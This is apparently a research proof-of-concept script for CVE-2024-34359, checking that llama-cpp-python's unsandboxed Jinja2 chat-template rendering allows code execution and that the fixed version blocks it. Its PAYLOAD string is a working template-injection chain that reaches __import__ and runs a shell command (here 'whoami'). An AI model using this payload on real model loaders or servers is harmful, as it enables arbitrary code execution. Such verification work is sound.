#!/usr/bin/env python3
"""PoC：llama-chat_format 的未沙箱化 Jinja2 渲染 → 模板注入 → 任意代码执行（CVE-2024-34359 的修复点）。

组件级验证（component-level）：
- 执行的是源码**原样**的函数 hf_tokenizer_config_to_chat_formatter
  （01-源码对照/p01-llama-jinja/vulnerable-llama_chat_format.py 与 fixed-...py）；
- 仅对 llama_cpp 的重型外部依赖（C 扩展、类型桩、logger）用桩替身，Jinja 渲染路径是真实代码；
- 威胁模型：tokenizer_config 里的 chat_template 来自不可信模型元数据（如 GGUF 元数据），
  被非沙箱 jinja2.Environment 直接编译渲染 → 模板里的 Python 属性链可达执行原语。

用法（用 04-利用验证/.venv 的解释器）：
    .venv/Scripts/python.exe poc1-jinja模板注入/run_poc.py

产出：evidence/ 下的渲染结果、marker 文件、判定摘要。载荷只做无害证明（写文件+whoami）。
"""
import hashlib
import shutil
import subprocess
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
MATERIALS = HERE.parent.parent
PAIR = MATERIALS / '01-源码对照' / 'p01-llama-jinja'
BUILD = HERE / 'build'
EVIDENCE = HERE / 'evidence'

VARIANTS = {
    'vuln': PAIR / 'vulnerable-llama_chat_format.py',
    'fixed': PAIR / 'fixed-llama_chat_format.py',
}

# 恶意 chat_template：遍历对象子类找到 catch_warnings，经其 __init__.__globals__ 拿到
# 内置 __import__，执行 whoami 并把结果写进 marker 文件（无害证明，无网络、无破坏）。
PAYLOAD = (
    "{% for c in ().__class__.__base__.__subclasses__() %}"
    "{% if c.__name__ == 'catch_warnings' %}"
    "{% set B = c.__init__.__globals__['__builtins__'] %}"
    "{% set IMP = B['__import__'] if B is mapping else B.__import__ %}"
    "{{ IMP('pathlib').Path('jinja_poc_marker.txt').write_text("
    "IMP('subprocess').run(['cmd','/c','whoami'],capture_output=True,text=True).stdout) }}"
    "{% endif %}{% endfor %}"
)

STUB = '''"""llama_cpp 外部依赖桩：只满足导入与无害调用，不参与被验证的渲染逻辑。"""
class _Dummy(dict):
    def __init__(self, *args, **kwargs):
        super().__init__(**kwargs)
    def __call__(self, *args, **kwargs):
        return _Dummy(**kwargs)
    def __getattr__(self, name):
        if name.startswith('__') and name.endswith('__'):
            raise AttributeError(name)
        return _Dummy()
    def __enter__(self):
        return self
    def __exit__(self, *exc):
        return False
def __getattr__(name):
    return _Dummy()
class Singleton:
    pass
def suppress_stdout_stderr(*args, **kwargs):
    return _Dummy()
'''


def build_shims(variant):
    root = BUILD / variant
    package = root / 'llama_cpp'
    shutil.rmtree(root, ignore_errors=True)
    package.mkdir(parents=True)
    (package / '__init__.py').write_text('', encoding='utf-8')
    for name in ('llama.py', 'llama_types.py', 'llama_grammar.py', '_logger.py', '_utils.py'):
        (package / name).write_text(STUB, encoding='utf-8')
    source = VARIANTS[variant]
    shutil.copy2(source, package / 'llama_chat_format.py')
    return root, hashlib.sha256(source.read_bytes()).hexdigest()


def run_case(variant, shim_root):
    sys.path.insert(0, str(shim_root))
    import llama_cpp.llama_chat_format as fmt

    config = {'chat_template': PAYLOAD, 'bos_token': '<s>', 'eos_token': '</s>'}
    formatter = fmt.hf_tokenizer_config_to_chat_formatter(config)
    try:
        result = formatter([{'role': 'user', 'content': 'hello'}])
        prompt = result['prompt'] if isinstance(result, dict) else getattr(result, 'prompt', str(result))
        marker = Path('jinja_poc_marker.txt')
        content = marker.read_text(encoding='utf-8', errors='replace').strip() if marker.exists() else '(marker 未生成)'
        print(f'[结果] {variant}: 渲染成功，模板代码被执行')
        print(f'[结果] 渲染产物片段: {prompt[:160]!r}')
        print(f'[结果] marker 内容(whoami): {content!r}')
        Path(f'rendered_prompt_{variant}.txt').write_text(prompt, encoding='utf-8')
    except Exception as error:  # 修复版预期在此被沙箱拒绝
        print(f'[结果] {variant}: 抛异常 {type(error).__name__}: {error}')
        Path(f'blocked_{variant}.txt').write_text(f'{type(error).__name__}: {error}\n', encoding='utf-8')


def main():
    if len(sys.argv) > 3 and sys.argv[1] == 'run':
        run_case(sys.argv[2], Path(sys.argv[3]))
        return
    EVIDENCE.mkdir(exist_ok=True)
    marker = EVIDENCE / 'jinja_poc_marker.txt'
    summary = []
    for variant in ('vuln', 'fixed'):
        if variant == 'vuln':
            marker.unlink(missing_ok=True)  # 先清旧痕迹，保证本轮证明干净
        else:
            if marker.exists():
                shutil.copy2(marker, EVIDENCE / 'jinja_poc_marker_from_vuln.txt')  # 漏洞版产物留档
                marker.unlink()
        shim_root, digest = build_shims(variant)
        print(f'== {variant} 版本（sha256 {digest[:16]}…）')
        result = subprocess.run([sys.executable, '-X', 'utf8', __file__, 'run', variant, str(shim_root)],
                                cwd=EVIDENCE, capture_output=True, text=True,
                                encoding='utf-8', errors='replace')
        print((result.stdout or '').strip())
        if result.returncode != 0:
            print((result.stderr or '').strip()[-800:])
        summary.append((result.stdout or '').strip())
    regenerated = marker.exists()
    verdict = (f'\n[判定] 漏洞版执行了模板代码并写出 marker；'
               f'修复版{"仍生成了 marker（异常，需复查）" if regenerated else "被沙箱拒绝、未生成 marker"}。')
    summary.append(verdict.strip())
    (EVIDENCE / '结论.txt').write_text('\n'.join(summary) + '\n', encoding='utf-8')
    print(verdict)
    print(f'证据已写入 {EVIDENCE}')


if __name__ == '__main__':
    main()
